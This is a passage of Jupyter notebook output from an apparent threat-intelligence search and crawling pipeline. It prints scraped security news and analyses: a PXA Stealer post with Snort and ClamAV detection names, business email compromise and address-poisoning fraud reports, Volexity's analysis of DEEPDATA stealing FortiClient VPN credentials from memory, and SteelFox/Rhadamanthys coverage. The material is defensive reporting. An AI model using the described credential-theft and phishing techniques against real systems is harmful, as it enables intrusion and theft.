            "[Umbrella](https://umbrella.cisco.com/), Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella [here](https://signup.umbrella.com/?utm_campaign=umbrella-free-trial&utm_content=automated-free-trial&utm_medium=web-referral%3Futm_source%3Dcisco&utm_term=pgm-talos-trial).\n",
            "[Cisco Secure Web Appliance](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html) (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.\n",
            "Additional protection with context to your specific environment and threat data are available from the [Firewall Management Center](https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html).\n",
            "[Cisco Duo](https://signup.duo.com/?utm_campaign=duo-free-trial&utm_medium=referral&utm_source=talos) provides multi-factor authentication for users to ensure only those authorized are accessing your network.\n",
            "Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on [Snort.org](https://www.snort.org/products). Snort SIDs for this threat are listed below:\n",
            "Snort2: 64217, 64204, 64216, 64215, 64214, 64213, 64212, 64211, 64210, 64209, 64208, 64207, 64206, 64205, 64203\n",
            "Snort3: 301057, 301063, 301062, 301061, 301060, 301059, 64217, 301058\n",
            "ClamAV detections are also available for this threat:\n",
            "Win.Loader.RustLoader-10036712-0\n",
            "Py.Infostealer.PXAStealer-10036718-0\n",
            "Py.Infostealer.PXAStealer-10036725-0\n",
            "Txt.Tool.PXAStealerInstaller-10036719-0\n",
            "Txt.Tool.PXAStealerInstaller-10036724-0\n",
            "Txt.Tool.PXAStealerInstaller-10036724-0\n",
            "Lnk.Downloader.PXAStealer-10036720-0\n",
            "Js.Infostealer.CookieStealer-10036722-0\n",
            "Indicators of Compromise\n",
            "IOCs for this research can be found in our GitHub repository [here](https://github.com/Cisco-Talos/IOCs/tree/main/2024/11).\n",
            "Share this post\n",
            "* [](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.talosintelligence.com%2Fnew-pxa-stealer%2F)\n",
            "* [](https://x.com/share?url=https%3A%2F%2Fblog.talosintelligence.com%2Fnew-pxa-stealer%2F)\n",
            "* [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fblog.talosintelligence.com%2Fnew-pxa-stealer%2F)\n",
            "* [](https://www.reddit/submit?url=https%3A%2F%2Fblog.talosintelligence.com%2Fnew-pxa-stealer%2F)\n",
            "* [](mailto:?body=New+PXA+Stealer+targets+government+and+education+sectors+for+sensitive+informationhttps%3A%2F%2Fblog.talosintelligence.com%2Fnew-pxa-stealer%2F)\n",
            "Related Content\n",
            "[Threat actors use copyright infringement phishing lure to deploy infostealers\n",
            "October 31, 2024 09:37\n",
            "* Cisco Talos has observed an unknown threat actor conducting a phishing campaign targeting Facebook business and advertising account users in Taiwan. * The decoy email and fake PDF filenames are designed to impersonate a company's legal department, attempting to lure the victim into downloading and executing malware. * This campaign](https://blog.talosintelligence.com/threat-actors-use-copyright-infringement-phishing-lure-to-deploy-infostealers/)\n",
            "[Threat Spotlight: WarmCookie/BadSpace\n",
            "October 23, 2024 06:02\n",
            "WarmCookie is a malware family that emerged in April 2024 and has been distributed via regularly conducted malspam and malvertising campaigns.](https://blog.talosintelligence.com/warmcookie-analysis/)\n",
            "[Highlighting TA866/Asylum Ambuscade Activity Since 2021\n",
            "October 23, 2024 06:02\n",
            "TA866 (also known as Asylum Ambuscade) is a threat actor that has been conducting intrusion operations since at least 2020.](https://blog.talosintelligence.com/highlighting-ta866-asylum-ambuscade/)\n",
            "*\n",
            "+ Intelligence Center\n",
            "+ [Intelligence Search](https://talosintelligence.com/reputation_center)\n",
            "+ [Email & Spam Trends](https://talosintelligence.com/reputation_center/email_rep)\n",
            "*\n",
            "+ Vulnerability Research\n",
            "+ [Vulnerability Reports](https://talosintelligence.com/vulnerability_info)\n",
            "+ [Microsoft Advisories](https://talosintelligence.com/ms_advisories)\n",
            "*\n",
            "+ Incident Response\n",
            "+ [Talos IR Capabilities](https://talosintelligence.com/incident_response)\n",
            "+ [Emergency Support](https://talosintelligence.com/incident_response)\n",
            "*\n",
            "+ Security Resources\n",
            "+ [Open Source Security Tools](https://talosintelligence.com/software)\n",
            "+ [Intelligence Categories Reference](https://talosintelligence.com/categories)\n",
            "+ [Secure Endpoint Naming Reference](https://talosintelligence.com/secure-endpoint-naming)\n",
            "*\n",
            "+ Media\n",
            "+ [Talos Intelligence Blog](https://blog.talosintelligence.com/)\n",
            "+ [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)\n",
            "+ [Beers with Talos Podcast](https://talosintelligence.com/podcasts/shows/beers_with_talos)\n",
            "+ [Talos Takes Podcast](https://talosintelligence.com/podcasts/shows/talos_takes)\n",
            "+ [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)\n",
            "*\n",
            "+ Support\n",
            "+ [Support Documentation](https://support.talosintelligence.com/)\n",
            "*\n",
            "+ Company\n",
            "+ [About Talos](https://talosintelligence.com/about)\n",
            "+ [Careers](https://talosintelligence.com/careers)\n",
            "+ [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)\n",
            "Follow us\n",
            "*\n",
            "[](https://x.com/talossecurity)\n",
            "*\n",
            "[](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)\n",
            "*\n",
            "[](https://www.linkedin.com/company/cisco-talos-intelligence-group/)\n",
            "[](http://tools.cisco.com/security/center/home.x)\n",
            "© 2024 Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our [Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)\n",
            "Highlights: [\"The attacker’s Telegram account has biography data that includes a link to a private antivirus checker website that allows users or buyers to assess the detection rate of a malware program. This website provides a platform for potential threat actors to evaluate the effectiveness and stealth capabilities of the malware before purchasing it, indicating a sophisticated level of service and professionalism in the threat actor's operations. We also discovered that the attacker is active in an underground Telegram channel, “Mua Bán Scan MINI,” mainly selling Facebook accounts, Zalo accounts, SIM cards, credentials, and money laundry data. Talos observed that this Vietnamese actor is also seen in the Telegram group in which the CoralRaider actor operates. However, we are not certain whether the actor is a member of the CoralRaider gang or another Vietnamese cybercrime group.\"]\n",
            "Highlight Scores: [0.3804161250591278]\n",
            "Summary: None\n",
            "\n",
            "\n",
            "Title: Scammer robs homebuyers of life savings in $20 million theft spree\n",
            "URL: https://www.malwarebytes.com/blog/news/2024/11/scammer-robs-homebuyers-of-life-savings-in-20-million-theft-spree\n",
            "ID: https://www.malwarebytes.com/blog/news/2024/11/scammer-robs-homebuyers-of-life-savings-in-20-million-theft-spree\n",
            "Score: 0.13473837077617645\n",
            "Published Date: 2024-11-14T00:00:00.000Z\n",
            "Author: Pieter Arntz\n",
            "Image: None\n",
            "Extras None\n",
            "Subpages: None\n",
            "Text: A 33-year-old Nigerian man living in the UK and his co-conspirators defrauded over 400 would-be home buyers in the US.\n",
            "In the initial phase, Babatunde Francis Ayeni and his criminal gang targeted US title companies, real estate agents, and real estate attorneys. Employees of these companies were tricked into clicking malicious attachments and links and filling in their email account login information on fake sites. The entered information went straight to the phishers and allowed the criminals to monitor the emails of those employees.\n",
            "As soon as the scammers spotted an email where someone was asked to make a payment as part of a real estate transaction, they would change the wiring instructions and let the victims deposit their payments into bank accounts associated with the criminals instead of the legitimate real estate transaction.\n",
            "Some 400 people fell victim to this sophisticated business email compromise (BEC) scheme. 231 of these victims were unable to reverse the wire transactions in time and lost their entire transaction—often their life savings.\n",
            "The total losses amount to nearly $20 million. To cover their tracks, the gang would buy Bitcoin with the stolen funds and divide it over three different addresses.\n",
            "Last year, the FBI warned BEC focused on the real estate sector was on the rise.\n",
            "“From calendar years 2020 to 2022, there was a 27% increase in victim reports to the Internet Crime Complaint Center (IC3) of BECs with a real estate nexus. In this same time frame, there was a 72% increase in victim loss of BECs with a real estate nexus.”\n",
            "Ayeni was sentenced to ten years in federal prison for his role in the massive cyber fraud conspiracy.\n",
            "During the multi-day sentencing hearing, numerous victims provided victim impact statements about how the crime affected them. They noted that in addition to losing all of the money they saved for the purchase of a new home, they felt significant shame, despair, and depression due to being victimized the way they were.\n",
            "United States Attorney Sean P. Costello said:\n",
            "“Cyber-enabled crimes can cause substantial and lasting harm to victims in an instant. Criminals across the world may believe that they are causing no harm to their victims and that they are safe behind their keyboards, but this case proves otherwise. With our law enforcement partners, we will continue to aggressively investigate, pursue, and hold accountable the crooks who perpetrate frauds online, wherever they are.”\n",
            "Better to double-check\n",
            "When transferring large sums of money, it’s advisable to double check whether the account details mentioned in any email correspond with those of the expected receiver of the funds.\n",
            "Use trusted contact information: always verify account details using contact information from a trusted source, and check whether it matches the information provided in the suspicious email or invoice.\n",
            "Call the company directly: Use a known, verified phone number to call the company and confirm any changes to payment instructions or account details.\n",
            "Use secure verification methods: If available, use secure portals or platforms provided by legitimate vendors to verify account information.\n",
            "If possible, follow up whether the payment came through at the legitimate receiver’s end while you still have the option to reverse the transaction.\n",
            " We don’t just report on threats—we remove them \n",
            "Cybersecurity risks should never spread beyond a headline. Keep threats off your devices by downloading Malwarebytes today.\n",
            "Highlights: ['“Cyber-enabled crimes can cause substantial and lasting harm to victims in an instant. Criminals across the world may believe that they are causing no harm to their victims and that they are safe behind their keyboards, but this case proves otherwise. With our law enforcement partners, we will continue to aggressively investigate, pursue, and hold accountable the crooks who perpetrate frauds online, wherever they are.” When transferring large sums of money, it’s advisable to double check whether the account details mentioned in any email correspond with those of the expected receiver of the funds. Use trusted contact information: always verify account details using contact information from a trusted source, and check whether it matches the information provided in the suspicious email or invoice.']\n",
            "Highlight Scores: [0.37941232323646545]\n",
            "Summary: None\n",
            "\n",
            "\n",
            "Title: Crypto phishing scam nets $129 million in USDT then funds mysteriously return\n",
            "URL: https://cryptoslate.com/crypto-phishing-scam-nets-129-million-in-usdt-then-funds-mysteriously-return/\n",
            "ID: https://cryptoslate.com/crypto-phishing-scam-nets-129-million-in-usdt-then-funds-mysteriously-return/\n",
            "Score: 0.1320408135652542\n",
            "Published Date: 2024-11-20T12:40:57.000Z\n",
            "Author: Oluwapelumi Adejumo\n",
            "Image: https://cryptoslate.com/wp-content/uploads/2024/11/phishing-hack-.jpg\n",
            "Extras None\n",
            "Subpages: None\n",
            "Text: Crypto phishing scam nets $129 million in USDT then funds mysteriously return   9 seconds ago ·  2 min read         Blockchain firm Scam Sniffer sheds light on how subtle address differences can lead to massive crypto losses amid a recent phishing attempt.           2 min read   Updated: Nov. 20, 2024 at 12:40 pm UTC        Cover art/illustration via CryptoSlate. Image includes combined content which may include AI-generated content.     A crypto whale narrowly avoided a $129 million USDT loss after falling victim to a phishing scam on the TRON blockchain. Blockchain security firm Scam Sniffer reported the incident on Nov. 20, detailing how the stolen funds were unexpectedly returned within hours. What happened? According to the firm, the scammer used a fake wallet address, “THc…bu8,” crafted to closely resemble the intended recipient’s “TMS…bu8.” The fraudulent address mimicked the original by matching its starting and ending characters. Despite testing the waters with a test 100 USDT transaction, the victim could not spot the subtle differences and eventually transferred $129 million to the wrong address. Surprisingly, the fraudster returned 90% of the stolen funds—116.7 million USDT— within an hour of the incident and eventually returned the remaining balance of 12.96 million USDT after four hours. Following the fund return, the victim promptly redirected the funds to their original destination, “TMS…bu8,” where they have since remained. Rising threat of address poisoning attacks Scam Sniffer identified this incident as a classic example of an address-poisoning attack, a phishing tactic gaining widespread traction in the industry. This scam involves creating wallet addresses nearly identical to those used by victims, differing by just one or two characters. Fraudsters then send small token amounts to victims, embedding the fake address in their transaction history to exploit copy-and-paste errors during future transfers. CertiK, another blockchain security firm, noted that this phishing tactic, along with wallet drainers, has led to the loss of more than $800 million worth of crypto assets this year. Due to this, Yu Xian, founder of web3 firm Slowmist, cautioned crypto users about the risks of copying sensitive information. He advised clearing clipboard data after use to avoid falling prey to such scams. Xian emphasized that no connected device is entirely secure, reinforcing the need for vigilance in safeguarding digital assets. Observers stated that this case further emphasizes the evolving sophistication of crypto phishing scams and highlights the importance of double-checking wallet addresses before making transfers. Mentioned in this article  Latest TRON Stories    Latest Press Releases\n",
            "Highlights: ['Blockchain security firm Scam Sniffer reported the incident on Nov. 20, detailing how the stolen funds were unexpectedly returned within hours. What happened? According to the firm, the scammer used a fake wallet address, “THc…bu8,” crafted to closely resemble the intended recipient’s “TMS…bu8.” The fraudulent address mimicked the original by matching its starting and ending characters. Despite testing the waters with a test 100 USDT transaction, the victim could not spot the subtle differences and eventually transferred $129 million to the wrong address. Surprisingly, the fraudster returned 90% of the stolen funds—116.7 million USDT— within an hour of the incident and eventually returned the remaining balance of 12.96 million USDT after four hours.']\n",
            "Highlight Scores: [0.29955828189849854]\n",
            "Summary: None\n",
            "\n",
            "\n",
            "Title: BrazenBamboo Weaponizes FortiClient Vulnerability to Steal VPN Credentials via DEEPDATA\n",
            "URL: https://www.volexity.com/blog/2024/11/15/brazenbamboo-weaponizes-forticlient-vulnerability-to-steal-vpn-credentials-via-deepdata/\n",
            "ID: https://www.volexity.com/blog/2024/11/15/brazenbamboo-weaponizes-forticlient-vulnerability-to-steal-vpn-credentials-via-deepdata/\n",
            "Score: 0.13093391060829163\n",
            "Published Date: 2024-11-15T00:00:00.000Z\n",
            "Author: Volexity\n",
            "Image: None\n",
            "Extras None\n",
            "Subpages: None\n",
            "Text: November 15, 2024\n",
            " \n",
            " \n",
            " Volexity discovered and reported a vulnerability in Fortinet's Windows VPN client, FortiClient, where user credentials remain in process memory after a user authenticates to the VPN. \n",
            " This vulnerability was abused by BrazenBamboo in their DEEPDATA malware. \n",
            " BrazenBamboo is the threat actor behind development of the LIGHTSPY malware family. \n",
            " LIGHTSPY variants have been discovered for all major operating systems, including iOS, and Volexity has recently discovered a new Windows variant. \n",
            "In July 2024, Volexity identified exploitation of a zero-day credential disclosure vulnerability in Fortinet’s Windows VPN client that allowed credentials to be stolen from the memory of the client’s process. This vulnerability was discovered while analyzing a recent sample of the DEEPDATA malware family. DEEPDATA is a modular post-exploitation tool for the Windows operating system that is used to gather a wide range of information from target devices. Analysis of the sample revealed a plugin that was designed to extract credentials from FortiClient VPN client process memory. On July 18, 2024, Volexity notified Fortinet about this vulnerability. Since the time of Volexity's initial discovery and reporting to Fortinet, ThreatFabric and Blackberry have each published reports that cover different aspects of some of the content discussed in this post.   \n",
            "Volexity attributes the development of DEEPDATA to a Chinese state-affiliated threat actor that it tracks as BrazenBamboo. Volexity has observed links between BrazenBamboo and three distinct malware families: LIGHTSPY, DEEPDATA, and DEEPPOST. Volexity tracks BrazenBamboo as the developer of these malware families and not necessarily one of the operators using them (there may be many). Volexity has also identified a new Windows variant of LIGHTSPY that was not previously documented at the time of writing.\n",
            "This blog post details the use and functionality of DEEPDATA, with a key look at zero-day exploitation of the FortiClient vulnerability, and how DEEPPOST is used to exfiltrate files from compromised systems. This blog post also looks at the recently discovered Windows variant of LIGHTSPY, including notable changes, and the associated wider command-and-control (C2) infrastructure of the BrazenBamboo threat actor.\n",
            "Malware Analysis\n",
            "Volexity’s analysis began with discovery of an archive file named deepdata.zip (SHA256:666a4c569d435d0e6bf9fa4d337d1bf014952b42cc6d20e797db6c9df92dd724) that is tied to BrazenBamboo. This archive contains several files that are part of two Windows malware families, which Volexity refers to as DEEPDATA and DEEPPOST. Each malware family is analyzed in the sections that follow. Volexity also separately obtained and analyzed a new Windows variant of LIGHTSPY that is described further below.\n",
            "DEEPDATA\n",
            "As previously mentioned, DEEPDATA is a modular post-exploitation tool for Windows that facilitates collection of sensitive information from a compromised system. This tool must be run from the command line of a system by an attacker. The DEEPDATA malware elements include the following:\n",
            " Filename \n",
            " Description \n",
            " data.dll \n",
            "DEEPDATA Loader\n",
            " mod.dat \n",
            "DEEPDATA Virtual File System (VFS)\n",
            " readme.txt \n",
            "File containing DEEPDATA Execution Options\n",
            "The readme.txt file describes how to execute the DEEPDATA loader, along with available parameters and a decryption key.\n",
            " \n",
            "The key parameter is used by the DEEPDATA loader file to decrypt and load the “core” components of the DEEPDATA malware family stored in the local VFS file (mod.dat). These components will always execute and are not dependent on additional parameters passed on the command line.\n",
            "The core components of DEEPDATA include the following files:\n",
            "  Filename \n",
            " Purpose \n",
            " frame.dll \n",
            "Shellcode – core orchestrator for plugin execution\n",
            " ffmpeg.dll \n",
            "Contains Heaven’s Gate code to load 32-bit code in 64-bit processes\n",
            " vertdll.dll \n",
            "Collects event logs\n",
            " iumdll.dll \n",
            "Library used to collect locally stored WeChat data\n",
            " ucrtbase_enclave.dll \n",
            "Library used to collect locally stored Feishu data\n",
            " d3dcompiler_47.dll \n",
            "Checks the running instant messaging apps (Line, Feishu, WeChat)\n",
            "The architecture of DEEPDATA’s loader, core, and plugins is shown below.\n",
            " \n",
            "The core components are always included in the VFS files, but Volexity was only able to find frame.dll stored on the C2 servers. While DEEPDATA plugins are stored in the VFS files, they are also stored as their own dedicated files on the C2 servers; they can be loaded from either location. The DEEPDATA plugins in the VFS are decrypted using the same key as the other components in the VFS.\n",
            "The overall plugin logic is the same as that seen in LIGHTSPY malware samples, with the following exported functions used by the core orchestrator:\n",
            " ExecuteCommand \n",
            " GetPluginCommandID \n",
            " GetPluginName \n",
            " GetPluginVersion \n",
            "DEEPDATA maintains configuration data within the VFS file with the following files stored in an encrypted state:\n",
            " Filename \n",
            " Description \n",
            " config.json \n",
            "Contains DEEPDATA configuration information\n",
            " manifest.json \n",
            "Contains DEEPDATA plugin information\n",
            " manifest1.json \n",
            "Contains DEEPDATA plugin information\n",
            " date.ini \n",
            "Purpose unclear, contains a single byte of 0x30 \n",
            "The manifest.json file is also stored on the C2 server but in an unencrypted state.\n",
            "Volexity identified a total of 12 unique plugins for DEEPDATA, which are summarized below:\n",
            " Plugin Name \n",
            " Plugin Capabilities \n",
            " AccountInfo \n",
            "Steal credentials from 18 different sources on the compromised device.\n",
            " AppData \n",
            "Collect data from WeChat, WhatsApp and Signal on the compromised device.\n",
            " Audio \n",
            "Record audio on compromised devices.\n",
            " ChatIndexedDb \n",
            "Steal databases from WhatsApp and Zalo chat clients.\n",
            "  FortiClient  \n",
            " Extract credentials and server information from process memory of FortiClient VPN processes.  \n",
            " Outlook \n",
            "Collect contacts and emails from local Microsoft Outlook instances.\n",
            " SocialSoft \n",
            "Steal data from WeChat, Line, QQ, DingDing, Skype, Telegram, and Feishu applications.\n",
            " SoftwareList \n",
            "List installed software, folders, and files recursively from a base location.\n",
            " SystemInfo \n",
            "Gather basic enumeration information from the compromised device.\n",
            " TdMonitor \n",
            "Hook Telegram to retrieve messages from the application.\n",
            " WebBrowser \n",
            "Collect history, cookies, and passwords from Firefox, Chrome, Opera, and Edge web browsers.\n",
            " WifiList \n",
            "Collect details of stored WiFi keys and nearby hotspots.\n",
            "As shown above, DEEPDATA supports a wide range of functionality to extract data from victims’ systems. The observed functionality of several plugins is commonly seen and includes items typically stolen from victim systems. However, Volexity noted the  FortiClient  plugin was uncommon and investigated it further. Volexity found the FortiClient plugin was included through a library with the filename msenvico.dll. This plugin was found to exploit a zero-day vulnerability in the Fortinet VPN client on Windows that allows it to extract the credentials for the user from memory of the client’s process.\n",
            "As seen in the code snippet below, the FortiClient plugin looks for the username, password, remote gateway, and port from two different JSON objects in memory.\n",
            " \n",
            "This is similar to a previously documented vulnerability identified in 2016, where credentials could be discovered in memory based on hardcoded offsets in memory. The previous vulnerability does not have an associated CVE.\n",
            "Volexity verified the presence of these JSON objects in memory and confirmed this approach works against the latest version available at the time of discovery (v\n",
            "Highlights: ['This archive contains several files that are part of two Windows malware families, which Volexity refers to as DEEPDATA and DEEPPOST. Each malware family is analyzed in the sections that follow. Volexity also separately obtained and analyzed a new Windows variant of LIGHTSPY that is described further below. As previously mentioned, DEEPDATA is a modular post-exploitation tool for Windows that facilitates collection of sensitive information from a compromised system. This tool must be run from the command line of a system by an attacker.']\n",
            "Highlight Scores: [0.35498353838920593]\n",
            "Summary: None\n",
            "\n",
            "\n",
            "Title: SteelFox and Rhadamanthys Malware Use Copyright Scams, Driver Exploits to Target Victims\n",
            "URL: https://thehackernews.com/2024/11/steelfox-and-rhadamanthys-malware-use.html\n",
            "ID: https://thehackernews.com/2024/11/steelfox-and-rhadamanthys-malware-use.html\n",
            "Score: 0.13092276453971863\n",
            "Published Date: 2024-11-07T00:00:00.000Z\n",
            "Author: The Hacker News\n",
            "Image: None\n",
            "Extras None\n",
            "Subpages: None\n",
            "Text: An ongoing phishing campaign is employing copyright infringement-related themes to trick victims into downloading a newer version of the Rhadamanthys information stealer since July 2024.\n",
            "Cybersecurity firm Check Point is tracking the large-scale campaign under the name CopyRh(ight)adamantys. Targeted regions include the United States, Europe, East Asia, and South America.\n",
            "\"The campaign impersonates dozens of companies, while each email is sent to a specific targeted entity from a different Gmail account, adapting the impersonated company and the language per targeted entity,\" the company said in a technical analysis. \"Almost 70% of the impersonated companies are from the Entertainment /Media and Technology/Software sectors.\"\n",
            "The attacks are notable for the deployment of version 0.7 of the Rhadamanthys stealer, which, as detailed by Recorded Future's Insikt Group early last month, incorporates artificial intelligence (AI) for optical character recognition (OCR).\n",
            "The Israeli company said the activity overlaps with a campaign that Cisco Talos disclosed last week as targeting Facebook business and advertising account users in Taiwan to deliver Lumma or Rhadamanthys stealer malware.\n",
            " \n",
            "The attack chains are characterized by the use of spear-phishing tactics that entail sending email messages claiming purported copyright violations by masquerading as well-known companies.\n",
            "These emails are sent from Gmail accounts and claim to be from legal representatives of the impersonated companies. The contents of the message accuse the recipients of misusing their brand on social media platforms and request them to remove the concerned images and videos.\n",
            "\"The removal instructions are said to be in a password-protected file. However, the attached file is a download link to appspot.com, linked to the Gmail account, which redirects the user to Dropbox or Discord to download a password-protected archive (with the password provided in the email),\" Check Point said.\n",
            "   \n",
            "The RAR archive contains three components, a legitimate executable vulnerable to DLL side-loading, the malicious DLL containing the stealer payload, and a decoy document. Once the binary is run, it sideloads the DLL file, which then paves the way for the deployment of Rhadamanthys.\n",
            "Check Point, which attributed the campaign to a likely cybercrime group, said that it's possible the threat actors have utilized AI tools given the scale of the campaign and the variety of the lures and sender emails.\n",
            "\"The campaign's widespread and indiscriminate targeting of organizations across multiple regions suggests it was orchestrated by a financially motivated cybercrime group rather than a nation-state actor,\" it said. \"Its global reach, automated phishing tactics, and diverse lures demonstrate how attackers continuously evolve to improve their success rates.\"\n",
            "New SteelFox Malware Exploits Vulnerable Driver\n",
            "The findings come as Kaspersky shed light on a new \"full-featured crimeware bundle\" dubbed SteelFox that's propagated via forums posts, torrent trackers, and blogs, passing off as legitimate utilities like Foxit PDF Editor, JetBrains, and AutoCAD.\n",
            "The campaign, dating back to February 2023, has claimed victims across the world, particularly those located in Brazil, China, Russia, Mexico, UAE, Egypt, Algeria, Vietnam, India, and Sri Lanka. It has not been attributed to any known threat actor or group.\n",
            "\"Delivered via sophisticated execution chains including shellcoding, this threat abuses Windows services and drivers,\" security researcher Kirill Korchemny said. \"It also uses stealer malware to extract the victim's credit card data as well as details about the infected device.\"\n",
            "The starting point is a dropper app that impersonates cracked versions of popular software, which, when executed, asks for administrator access and drops a next-stage loader that, in turn, establishes persistence and launches the SteelFox DLL.\n",
            " \n",
            "The admin access is subsequently abused to create a service that runs an older version of WinRing0.sys, a hardware access library for Windows that's vulnerable to CVE-2020-14979 and CVE-2021-41285, thereby allowing the threat actor to obtain NT\\SYSTEM privileges.\n",
            "\"This driver is also a component of the XMRig miner, so it is utilized for mining purposes,\" Korchemny noted. \"After initializing the driver, the sample launches the miner. This represents a modified executable of XMRig with junk code fillers. It connects to a mining pool with hardcoded credentials.\"\n",
            "The miner, for its part, is downloaded from a GitHub repository, with the malware also initiating contact with a remote server over TLS version 1.3 to exfiltrate sensitive data from web browsers, such as cookies, credit card data, browsing history, and visited places, system metadata, installed software, and timezone, among others.\n",
            "\"Highly sophisticated usage of modern C++ combined with external libraries grant this malware formidable power,\" Kaspersky said. \"Usage of TLSv1.3 and SSL pinning ensures secure communication and harvesting of sensitive data.\"\n",
            "Found this article interesting? Follow us on Twitter   and LinkedIn to read more exclusive content we post.\n",
            "Highlights: ['An ongoing phishing campaign is employing copyright infringement-related themes to trick victims into downloading a newer version of the Rhadamanthys information stealer since July 2024. Cybersecurity firm Check Point is tracking the large-scale campaign under the name CopyRh(ight)adamantys. Targeted regions include the United States, Europe, East Asia, and South America. \"The campaign impersonates dozens of companies, while each email is sent to a specific targeted entity from a different Gmail account, adapting the impersonated company and the language per targeted entity,\" the company said in a technical analysis. The attacks are notable for the deployment of version 0.7 of the Rhadamanthys stealer, which, as detailed by Recorded Future\\'s Insikt Group early last month, incorporates artificial intelligence (AI) for optical character recognition (OCR).']\n",
            "Highlight Scores: [0.38518399000167847]\n",
            "Summary: None\n",
            "\n",
            "\n",
            "Autoprompt String: Heres the latest cyber incident involving LunarsGo Threat Actor in 2024:\n",
            "Resolved Search Type: 2024-10-26T06:58:13.139Z\n",
            "DEBUG: Exa Search results are not a SearchResponse. Type: <class 'exa_py.api.SearchResponse'>\n",
            "[INIT].... → Crawl4AI 0.3.742\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-16-6f1cf4047857>:246: DeprecationWarning: Cache control boolean flags are deprecated and will be removed in version X.X.X. Use 'cache_mode' parameter instead. Examples:\n",
            "- For bypass_cache=True, use cache_mode=CacheMode.BYPASS\n",
            "- For disable_cache=True, use cache_mode=CacheMode.DISABLED\n",
            "- For no_cache_read=True, use cache_mode=CacheMode.WRITE_ONLY\n",
            "- For no_cache_write=True, use cache_mode=CacheMode.READ_ONLY\n",
            "Pass warning=False to suppress this warning.\n",
            "  result = await crawler.arun(\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "[INIT].... → Crawl4AI 0.3.742\n",
            "[ERROR]... × No URL... | Error: URL must start with 'http://', 'https://', 'file://', or 'raw:'\n",
            "ERROR: Failed to crawl the page No URL\n",
            "[INIT].... → Crawl4AI 0.3.742\n",
            "[INIT].... → Crawl4AI 0.3.742\n",
            "[INIT].... → Crawl4AI 0.3.742\n",
            "[FETCH]... ↓ https://www.cm-alliance.com/cybersecurity-blog/oct... | Status: True | Time: 30.41s\n",
            "[SCRAPE].. ◆ Processed https://www.cm-alliance.com/cybersecurity-blog/oct... | Time: 2548ms\n",
            "Error extracting field publication_date: unhashable type: 'list'\n",
            "[EXTRACT]. ■ Completed for https://www.cm-alliance.com/cybersecurity-blog/oct... | Time: 1.9509048700001586s\n",
            "[COMPLETE] ● https://www.cm-alliance.com/cybersecurity-blog/oct... | Status: True | Total: 36.28s\n",
            "[FETCH]... ↓ https://socradar.io/major-cyber-attacks-in-review-... | Status: True | Time: 40.37s\n",
            "[SCRAPE].. ◆ Processed https://socradar.io/major-cyber-attacks-in-review-... | Time: 1198ms\n",
            "Error extracting field publication_date: unhashable type: 'list'\n",
            "[EXTRACT]. ■ Completed for https://socradar.io/major-cyber-attacks-in-review-... | Time: 1.124447300000611s\n",
            "[COMPLETE] ● https://socradar.io/major-cyber-attacks-in-review-... | Status: True | Total: 43.36s\n",
            "[FETCH]... ↓ https://purplesec.us/breach-report/... | Status: True | Time: 51.94s\n",
            "[SCRAPE].. ◆ Processed https://purplesec.us/breach-report/... | Time: 1507ms\n",
            "Error extracting field publication_date: unhashable type: 'list'\n",
            "[EXTRACT]. ■ Completed for https://purplesec.us/breach-report/... | Time: 0.9761906069998076s\n",
            "[COMPLETE] ● https://purplesec.us/breach-report/... | Status: True | Total: 55.51s\n",
            "[FETCH]... ↓ https://www.techradar.com/pro/top-data-breaches-an... | Status: True | Time: 57.88s\n",
            "[SCRAPE].. ◆ Processed https://www.techradar.com/pro/top-data-breaches-an... | Time: 428ms\n",
            "Error extracting field publication_date: unhashable type: 'list'\n",
            "[EXTRACT]. ■ Completed for https://www.techradar.com/pro/top-data-breaches-an... | Time: 0.7588130119993366s\n",
            "[COMPLETE] ● https://www.techradar.com/pro/top-data-breaches-an... | Status: True | Total: 59.45s\n",
            "Crawled Results: [[{'links': '/', 'images': 'https://purplesec.us/wp-content/uploads/2022/09/cropped-PurpleSec-Favicon.png'}], [{'links': '#main', 'images': 'https://vanilla.futurecdn.net/techradar/media/shared/img/flags/nosize/US.svg'}], [{'links': 'https://socradar.io/labs/dark-web-report/?utm_campaign=SOCRadarLabsNurturing&#038;utm_source=website&#038;utm_medium=topheader&#038;utm_term=topheaderCTA&#038;utm_content=DWRTopHeader5', 'images': 'https://socradar.io/wp-content/themes/socradar/assets/image/static/shadow-5.png.webp'}], [{'links': 'javascript:void(0);', 'images': 'https://cdn-cookieyes.com/assets/images/revisit.svg'}]]\n",
            "Missing 'content' or 'links' key in crawled result item: {'links': '/', 'images': 'https://purplesec.us/wp-content/uploads/2022/09/cropped-PurpleSec-Favicon.png'}\n",
            "Missing 'content' or 'links' key in crawled result item: {'links': '#main', 'images': 'https://vanilla.futurecdn.net/techradar/media/shared/img/flags/nosize/US.svg'}\n",
            "Missing 'content' or 'links' key in crawled result item: {'links': 'https://socradar.io/labs/dark-web-report/?utm_campaign=SOCRadarLabsNurturing&#038;utm_source=website&#038;utm_medium=topheader&#038;utm_term=topheaderCTA&#038;utm_content=DWRTopHeader5', 'images': 'https://socradar.io/wp-content/themes/socradar/assets/image/static/shadow-5.png.webp'}\n",
            "Missing 'content' or 'links' key in crawled result item: {'links': 'javascript:void(0);', 'images': 'https://cdn-cookieyes.com/assets/images/revisit.svg'}\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://ciobusinessworld.com/wp-content/uploads/2023/12/The-3-Cyber-Security-Incidents-in-2024.jpg\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
